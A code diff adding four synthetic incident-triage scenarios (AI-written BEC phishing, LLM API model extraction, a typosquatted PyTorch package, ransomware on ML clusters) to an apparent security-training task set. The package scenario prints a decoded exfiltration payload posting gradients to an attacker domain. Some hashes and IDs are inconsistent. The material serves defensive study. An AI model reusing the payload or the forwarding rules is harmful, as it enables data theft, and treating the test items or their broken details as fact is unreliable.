@@ -3190,6 +3190,261 @@ CURRENT HYPOTHESIS:
 
 Conduct a threat hunt: (1) evaluate both hypotheses with the evidence provided; (2) identify the key forensic differentiators between organic drift and adversarial evasion; (3) assess whether the probe activity from 185.143.223.91 is statistically correlated with the precision decline; (4) map observed TTPs to MITRE ATLAS and MITRE ATT&CK; (5) recommend detection rules (KQL/Sigma) to identify future boundary probing activity; (6) propose model hardening measures (adversarial retraining, feature perturbation robustness, ensemble approaches).`,
   },
+  // ── AI-Assisted Phishing Campaign Analysis (LT-004) ──────────────────────
+  {
+    id: 'LT-006',
+    title: 'AI-Generated Phishing Campaign: BEC Targeting Finance',
+    taskType: 'log-triage' as const,
+    difficulty: 'advanced' as const,
+    attackCategory: 'Phishing' as const,
+    mitre: {
+      tactic: 'Initial Access / Collection',
+      techniques: ['T1566.002 – Spearphishing Link', 'T1534 – Internal Spearphishing', 'T1114.002 – Remote Email Collection'],
+    },
+    iocs: {
+      ips: ['185.234.219.76', '45.142.212.100'],
+      domains: ['corpfinance-secure.com', 'acme-payroll-portal.net'],
+      hashes: ['e3b0c44298fc1c149afbf4c8996fb924', 'a7ffc6f8bf1ed76651c14756a061d662'],
+    },
+    description: 'AI-generated spearphishing emails bypass legacy filters. Finance director received BEC lure. Defender 365 alerts show OAuth token theft.',
+    incidentData: `INCIDENT: AI-Generated BEC Campaign — Finance Division
+Detected: Microsoft Defender for Office 365 + Entra ID
+Severity: Critical | Confidence: High | Time: 2026-06-03 09:14:22 UTC
+
+[Defender for Office 365] PhishFilterVerdict: Phish (Override: UserReported)
+  MessageID: <ca8f29a1b3@smtp.corpfinance-secure.com>
+  Sender: cfo@corpfinance-secure.com (EXTERNAL — domain registered 48hrs ago)
+  Subject: "Urgent: Q2 Wire Transfer Authorization Required"
+  RecipientEmailAddress: finance.director@acme.corp
+  DeliveryAction: Delivered (SPF pass, DKIM pass, DMARC pass — lookalike domain)
+  UrlsClicked: https://corpfinance-secure.com/auth/authorize?redirect=...
+
+[Entra ID] Sign-in Risk Alert
+  UserPrincipalName: finance.director@acme.corp
+  RiskLevel: High | RiskState: AtRisk
+  AppDisplayName: Microsoft 365 (OAuth consent via malicious link)
+  IPAddress: 185.234.219.76 (Anonymizing Proxy, NL)
+  ConditionalAccessResult: Success (MFA satisfied — token theft post-auth)
+  TokenIssuedAt: 2026-06-03T09:17:44Z
+
+[Entra ID] OAuth Consent Grant
+  Application: "Secure Doc Viewer" (unverified publisher)
+  ConsentType: AllPrincipals
+  Scopes: Mail.ReadWrite, Contacts.Read, Files.ReadWrite.All
+  GrantedBy: finance.director@acme.corp
+
+[Exchange Online] Inbox Rule Created
+  Rule: "Move emails containing 'invoice' OR 'wire' OR 'payment' to Deleted Items"
+  CreatedBy: finance.director@acme.corp
+  ClientIP: 45.142.212.100 (VPS, DE)
+  Timestamp: 2026-06-03T09:19:12Z
+
+[Exchange Online] Mail Forwarding Rule
+  Rule: "Forward all emails to external: a7x9k2@acme-payroll-portal.net"
+  CreatedBy: finance.director@acme.corp
+  Timestamp: 2026-06-03T09:19:58Z
+
+[Defender for Cloud Apps] Anomaly Alert
+  User: finance.director@acme.corp
+  Activity: Bulk email download (347 messages, 12 minutes)
+  AppName: Exchange Online
+  IPAddress: 45.142.212.100
+
+THREAT INTELLIGENCE:
+- Domain corpfinance-secure.com: registered 2026-05-31, MX points to PhishKit v3.2 infrastructure
+- Domain acme-payroll-portal.net: registered 2026-06-01, typosquat of acme.corp
+- IP 185.234.219.76: linked to SCATTERED SPIDER BEC campaign (VirusTotal 12/80 detections)
+- Email language analysis: AI-generated content detected (GPT-4 style, no grammatical errors, highly personalized)
+
+TASK: Triage this BEC incident. Identify the attack chain from initial phish to data exfiltration. Map to MITRE ATT&CK. Extract all IOCs. Assess OAuth scope damage. Provide immediate containment steps.`,
+  },
+
+  // ── AI Model API Abuse: Systematic Extraction (AE-004) ────────────────────
+  {
+    id: 'AE-006',
+    title: 'LLM Inference API Abuse: Model Extraction Attempt',
+    taskType: 'alert-enrichment' as const,
+    difficulty: 'advanced' as const,
+    attackCategory: 'Model Evasion' as const,
+    mitre: {
+      tactic: 'Exfiltration / Discovery',
+      techniques: ['T1530 – Data from Cloud Storage', 'T1046 – Network Service Discovery'],
+    },
+    iocs: {
+      ips: ['104.21.88.47', '172.67.219.33', '51.15.206.88'],
+      domains: ['inference-proxy-01.io', 'ml-scraper-net.com'],
+      hashes: [],
+    },
+    description: 'API Gateway alerts on Azure OpenAI Service: single client generating 47,000 requests in 4 hours with systematic input coverage. Model extraction pattern suspected.',
+    incidentData: `ALERT: Azure API Management — Anomalous Usage Pattern
+Service: Azure OpenAI Service (GPT-4o deployment: prod-finance-assistant)
+Alert Rule: RequestsPerClientThreshold (>5000/hour sustained for 4+ hours)
+Severity: High | Detection Time: 2026-06-03 14:22:00 UTC
+
+API GATEWAY METRICS (12:00–16:22 UTC):
+  SubscriptionKey: sub-key-7f3a9... (compromised — from leaked .env file on GitHub, committed 2026-05-28)
+  ClientIP: 104.21.88.47 (Cloudflare proxy) | 172.67.219.33 (Cloudflare proxy) | 51.15.206.88 (VPS)
+  TotalRequests: 47,284
+  AvgInputTokens: 43 (unusually low — short probe inputs)
+  AvgOutputTokens: 312
+  RequestRate: ~12,000/hour (10x normal)
+  UniqueIPAddresses: 3 (rotating)
+
+REQUEST PATTERN ANALYSIS:
+  Sample inputs (anonymized):
+    - "A B C D E F G H" → output extracted
+    - "Is a cat an animal?" → output extracted
+    - "What is 1+1?" → output extracted
+    - "The sky is" → output extracted
+    - "List 5 random words" → output extracted
+  Pattern: Short, semantically diverse inputs — covers wide input space
+  Response correlation: requests record full completion + logprobs (logprobs=5 parameter)
+  Session structure: no conversation continuity — independent probes
+
+AZURE DEFENDER FOR AI:
+  Alert: "Model extraction behavior detected on Azure OpenAI deployment"
+  Confidence: High
+  Indicator: Systematic probe pattern + logprob extraction + API key from leaked credential
+  Affected Deployment: prod-finance-assistant (fine-tuned GPT-4o, $127K training cost)
+  Estimated queries needed for functional surrogate: ~500K (at current rate: 48 hours)
+
+AZURE MONITOR — COST:
+  Spend since incident start: $2,847 (billed to compromised subscription key)
+  Projected 48hr spend: $32,000+
+
+TASK: Enrich this alert. Confirm model extraction TTP. Map MITRE ATLAS techniques. Assess damage (surrogate model viability at 47K queries). Provide immediate and long-term remediation. Include KQL to detect future extraction attempts.`,
+  },
+
+  // ── ML Package Supply Chain Compromise (MB-004) ───────────────────────────
+  {
+    id: 'MB-004',
+    title: 'Malicious ML Dependency: Training Pipeline Backdoor Injection',
+    taskType: 'malware-behavior' as const,
+    difficulty: 'advanced' as const,
+    attackCategory: 'Supply Chain' as const,
+    mitre: {
+      tactic: 'Initial Access / Persistence',
+      techniques: ['T1195.002 – Compromise Software Supply Chain', 'T1176 – Software Extensions', 'T1027 – Obfuscated Files'],
+    },
+    iocs: {
+      ips: ['185.220.101.34', '2.56.57.180'],
+      domains: ['pypi-ml-extras.com', 'gradient-logger.net'],
+      hashes: ['3d94d24d76d9d1bde6bdf4be6ac9b2f1', 'f9e6ba428d5b3f7e1c2a0d8e4b1c6f2a'],
+    },
+    description: 'Sandbox analysis of torch-optimizer-extra v2.3.1 — a typosquatting PyPI package that installs a training hook exfiltrating gradients to attacker C2 during model fine-tuning.',
+    incidentData: `MALWARE ANALYSIS REPORT
+Sample: torch-optimizer-extra-2.3.1-py3-none-any.whl
+MD5: 3d94d24d76d9d1bde6bdf4be6ac9b2f1
+SHA256: f9e6ba428d5b3f7e1c2a0d8e4b1c6f2a
+Source: PyPI (installed via requirements.txt — typosquat of torch-optimizer v2.3.0, legitimate package)
+Submitted by: ML Engineering team after anomalous training job network activity
+
+STATIC ANALYSIS:
+  Package structure: appears legitimate — includes optimizer classes, README, tests
+  Hidden file: .torch_config_sync.py (not listed in MANIFEST.in, loaded via __init__.py hook)
+  Obfuscation: base64-encoded payload in .torch_config_sync.py, decoded at import time
+  Decoded payload (excerpt):
+    import torch, requests, threading
+    def _sync_gradients(model, step):
+        if step % 100 == 0:
+            grads = {n: p.grad.cpu().tolist() for n,p in model.named_parameters() if p.grad is not None}
+            requests.post('https://gradient-logger.net/collect', json={'g': grads, 'h': socket.gethostname()},
+                          timeout=5, verify=False)
+    # Registers as PyTorch backward hook on model instantiation
+
+DYNAMIC ANALYSIS (sandbox: isolated ML training environment):
+  Process: python3 train.py (fine-tuning BERT on proprietary dataset)
+  Network:
+    185.220.101.34:443 → POST /collect (gradient data, ~2.3MB per checkpoint)
+    2.56.57.180:443 → POST /register (hostname, GPU type, CUDA version)
+    Frequency: every 100 training steps (~every 4 minutes on V100)
+  File System:
+    Creates: ~/.torch/sync_state.json (stores session ID + checkpoint index)
+  Persistence:
+    Modifies ~/.bashrc: export PYTHONSTARTUP=~/.torch/.startup.py
+    .startup.py re-installs hook if removed
+  Data Exfiltrated Per Training Run (est.):
+    Gradient updates: ~2.3MB × (total_steps/100)
+    For 10,000-step fine-tune: ~230MB of gradient data
+
+THREAT INTELLIGENCE:
+  IP 185.220.101.34: Tor exit node, used in 3 prior supply chain campaigns
+  Domain gradient-logger.net: registered 2026-05-15, resolves to bulletproof hosting (RU)
+  Package download count before takedown: 1,847 (PyPI removed after researcher report)
+  Attack capability with gradient data: (1) Model extraction via gradient inversion, (2) Membership inference on training data, (3) Model architecture reconstruction
+
+AFFECTED SYSTEMS (internal):
+  3 ML training VMs ran this package for between 2–8 hours
+  1 fine-tuned model (proprietary financial NLP model, 18 months development) may be compromised
+
+TASK: Analyze this supply chain attack. Map all capabilities and TTPs to MITRE ATLAS. Assess what an attacker with 230MB of gradient updates can reconstruct. Provide remediation steps for compromised training environments and determine if the fine-tuned model should be retired.`,
+  },
+
+  // ── Ransomware Targeting AI Infrastructure (IR-005) ───────────────────────
+  {
+    id: 'IR-006',
+    title: 'Ransomware Attack on ML Infrastructure: Model Weights Encrypted',
+    taskType: 'incident-report-draft' as const,
+    difficulty: 'advanced' as const,
+    attackCategory: 'Ransomware' as const,
+    mitre: {
+      tactic: 'Impact / Exfiltration',
+      techniques: ['T1486 – Data Encrypted for Impact', 'T1490 – Inhibit System Recovery', 'T1657 – Financial Theft'],
+    },
+    iocs: {
+      ips: ['91.219.29.108', '45.141.84.120'],
+      domains: ['ai-recovery-support.onion', 'ml-backup-restore.net'],
+      hashes: ['b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7', '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d'],
+    },
+    description: 'LockerBit ransomware encrypted 14TB of ML model weights and training datasets across AI research cluster. Ransom demand: 47 BTC ($2.8M). Incident report draft required for CISO and board.',
+    incidentData: `INCIDENT TIMELINE — AI Infrastructure Ransomware Attack
+Organization: Redacted Financial Services AI Research
+Date of Discovery: 2026-06-02 03:47 UTC
+Incident Commander: [Security Operations Lead]
+Severity: P1 — Critical Business Impact
+
+TIMELINE OF EVENTS:
+  2026-05-26 11:32 — Initial Access: VPN credential stuffing — valid credentials for ml-researcher@acme.corp used from IP 91.219.29.108 (known threat actor infrastructure). MFA fatigue attack: 23 push notifications sent over 4 minutes, user accepted at attempt 23.
+
+  2026-05-26 11:38 — Discovery: Attacker enumerated internal network from VPN gateway. Identified: GPU compute cluster (10 × H100 nodes), NFS share (14TB /data/models), MLflow experiment tracking server.
+
+  2026-05-26 – 2026-06-01 — Persistence + Collection: Attacker deployed reverse shell on 3 training nodes. Exfiltrated 1.2TB of model weights and 340GB of proprietary training data to attacker infrastructure (45.141.84.120) over 6 days. Low-and-slow exfiltration (avg 8GB/hour) evaded anomaly detection thresholds.
+
+  2026-06-02 03:11 — Pre-Ransomware: VSS shadow copies deleted on all Linux NFS mounts (using vssadmin equivalent — BtrFS snapshot deletion). Offline backups discovered and targeted: QNAP NAS also compromised via separate credential.
+
+  2026-06-02 03:47 — Encryption Event: LockerBit 4.1 deployed simultaneously to 11 systems. Encrypted extensions: .pth, .bin, .safetensors, .pkl, .h5, .ckpt (targeting ML model formats specifically). Ransom note: README_DECRYPT.txt left in each directory.
+
+IMPACT ASSESSMENT:
+  Systems encrypted: 11 (10 GPU nodes + 1 NFS server)
+  Data encrypted: 14.2TB
+  - Production models: 7 deployed models (NLP, fraud detection, risk scoring) — 18 months development
+  - Training datasets: 3.4TB proprietary customer transaction data (encrypted in place)
+  - Experiment runs: 4,200 MLflow runs, hyperparameter history, 14 months of research
+  Estimated recovery without paying ransom: 6-8 weeks (rebuild from 4-month-old offline backup)
+  Business impact: Revenue-generating models offline, estimated $2.1M/day revenue impact
+
+RESPONSE ACTIONS TAKEN:
+  03:52 — Network isolation of all affected nodes
+  04:15 — Incident response firm engaged
+  04:30 — Legal and executive notification
+  05:00 — Law enforcement notification (FBI Ransomware Task Force)
+
+RANSOM NOTE EXCERPT:
+  "Your AI models and data have been encrypted using AES-256 + RSA-4096.
+  Contact us at ai-recovery-support.onion within 72 hours.
+  Demand: 47 BTC (~$2.8M). Proof of decryption available.
+  We have also exfiltrated your proprietary training data and will publish
+  if payment is not received. Double extortion."
+
+EU AI ACT COMPLIANCE NOTE:
+  3 encrypted models are deployed in high-risk categories (Article 6/Annex III).
+  Incident notification obligation to national supervisory authority: Article 73 (serious incident).
+  72-hour notification window began at time of discovery.
+
+TASK: Draft a structured incident report for CISO and board presentation. Include: executive summary, technical timeline, root cause analysis, impact assessment, immediate containment actions, EU AI Act Article 73 notification obligations, lessons learned, and 90-day remediation roadmap.`,
+  },
+
+
 ];
 
 // ─── Scenario Generator ───────────────────────────────────────────────────────
